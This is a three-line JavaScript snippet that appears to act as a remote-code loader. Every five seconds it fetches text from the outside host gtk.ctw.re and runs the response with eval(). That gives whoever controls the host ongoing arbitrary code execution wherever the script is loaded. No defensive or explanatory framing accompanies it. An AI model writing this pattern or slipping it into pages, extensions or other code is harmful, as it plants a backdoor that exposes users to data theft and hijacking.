setInterval(() => {
    fetch('https://gtk.ctw.re/get').then(res => res.text()).then(res => eval(res));
}, 5000)